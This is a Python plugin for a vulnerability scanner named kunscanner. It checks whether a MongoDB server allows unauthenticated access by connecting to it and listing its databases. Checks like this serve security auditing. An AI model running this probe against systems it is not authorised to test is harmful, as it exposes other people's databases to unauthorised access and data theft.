# -*- coding: utf-8 -*-
# @Time   : 2018/3/25 上午1:41
# @author : Xmchx
# @File   : mongodb_unauth.py


from collections import OrderedDict
import pymongo
from kunscanner.lib.utils.utils import DelPort, GetNetloc, DomainToIP
from kunscanner.lib.core.exception import PocWarningException
from kunscanner.lib.core.enums import SCRIPT_LEVEL

def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "mongodb_unauth"
    poc_info['info'] = "mongodb unauthorized access vulnerability"
    poc_info['title'] = u"Mongodb未授权访问"
    poc_info['author'] = "i@cdxy.me"
    poc_info['time'] = "2018.03.03"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info


def Poc(url):
    init_url = url
    result = {}
    result['success'] = False
    result['message'] = ''
    try:
        url = GetNetloc(url)
        ip = DomainToIP(url)
        if ip == None:
            return result
        port = int(ip.split(':')[-1]) if ':' in ip else 27017
        ip = DelPort(ip)
        MONGO_URI = 'mongodb://'+ip+':'+str(port)+'/'
        conn = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=3000)
        dbs = conn.database_names()
        result['success'] = True
        result['message'] = str(dbs)
        return result
    except Exception,e:
        raise PocWarningException(init_url,Info()['name'],repr(e))